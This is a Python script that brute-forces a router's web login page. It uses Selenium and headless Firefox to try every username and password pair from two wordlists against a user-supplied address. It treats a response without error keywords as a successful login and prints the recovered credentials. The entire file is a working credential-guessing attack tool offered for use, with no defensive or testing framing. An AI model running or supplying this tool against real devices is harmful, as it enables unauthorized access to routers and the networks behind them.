# chmod +x /PATH-TO/selenium/webdriver/common/linux/selenium-manager

import sys
import time
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# ANSI Colors
YELLOW = "\033[93m"
BLUE = "\033[94m"
GREEN = "\033[92m"
RESET = "\033[0m"

def colored_print(text, color):
    return f"{color}{text}{RESET}"

def get_user_input(default, prompt, color):
    user_input = input(colored_print(prompt, color))
    if not user_input:
        return default
    return user_input

def main():
    url = get_user_input('http://192.168.1.1', "Router's ip (default: 192.168.1.1): ", RESET)
    print("\r")

    expression = {b"error", b"incorrect", b"failure", b"try", b"again", b"invalid"}

    u_name = get_user_input("username", "Username html element name (default: username): ", YELLOW)
    username_element_type = get_user_input("i", "Is username element an id or a name? (i/n): ", YELLOW)

    p_word = get_user_input("password", "Password html element name (default: password): ", BLUE)
    password_element_type = get_user_input("i", "Is password element an id or a name? (i/n): ", BLUE)

    button = get_user_input("button", "Button html element name (default: button): ", GREEN)
    button_element_type = get_user_input("i", "Is button element an id or a name? (i/n): ", GREEN)

    if username_element_type == "i":
        username_element_type = By.ID
    elif username_element_type == "n":
        username_element_type = By.NAME

    if password_element_type == "i":
        password_element_type = By.ID
    elif password_element_type == "n":
        password_element_type = By.NAME

    if button_element_type == "i":
        button_element_type = By.ID
    elif button_element_type == "n":
        button_element_type = By.NAME

    options = Options()
    options.headless = True
    driver = webdriver.Firefox(options=options)
    print(colored_print("\rFirefox WebDriver started successfully", YELLOW))

    combinations_tested = 0
    usernames = [u.strip() for u in open("username.txt", "r").readlines()]
    passwords = [p.strip() for p in open("password.txt", "r").readlines()]
    total_combinations = len(usernames) * len(passwords)
    
    try:
        for username in usernames:
            for password in passwords:
                combinations_tested += 1
                sys.stdout.write("\nCombinations tested: %d/%d" % (combinations_tested, total_combinations))
                sys.stdout.flush()
                brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button)
    except KeyboardInterrupt:
        print("\n\033[91mExiting...\033[0m")
    finally:
        driver.quit()

def brute(username, password, combinations_tested, total_combinations, driver, url, expression, username_element_type, u_name, password_element_type, p_word, button_element_type, button):
    try:
        driver.get(url)
        print(colored_print("\nPage loaded successfully", GREEN))

        driver.implicitly_wait(10)

        page_loaded = driver.execute_script("return document.readyState") == "complete"
        if not page_loaded:
            print("Page not fully loaded. Retrying in 2 seconds...")
            time.sleep(2)
            page_loaded = driver.execute_script("return document.readyState") == "complete"
            if not page_loaded:
                print("Page still not fully loaded. Exiting...")
                sys.exit(1)
            else:
                print("Page loaded successfully after waiting.")

        print(colored_print("Waiting for username input field to become visible...", BLUE))

        username_input = WebDriverWait(driver, 10).until(
            EC.visibility_of_element_located((username_element_type, u_name))
        )
        print(colored_print("Username input field found and visible", YELLOW))

        password_input = driver.find_element(password_element_type, p_word)

        username_input.clear()
        username_input.send_keys(username)
        password_input.clear()
        password_input.send_keys(password)

        try:
            submit_button = driver.find_element(button_element_type, button)
            submit_button.click()
            print(colored_print("Form submission successful", GREEN))
            time.sleep(5)
        except Exception as e:
            print("Error clicking submit button:", e)

        time.sleep(2)

        driver_lower_content = driver.page_source.lower().encode('utf-8')

        if not any(item in driver_lower_content for item in expression):
            print("\nBrute Forcing...")
            print("[+] Username: ", username)
            print("[+] Password: ", password)
            print("Server Response:", driver.page_source.encode('utf-8'))
            sys.exit()
        else:
            print("Success condition not met")
            print(driver_lower_content)
    except Exception as e:
        print("Error using Selenium:", e)
        sys.exit(1)

if __name__ == '__main__':
    main()
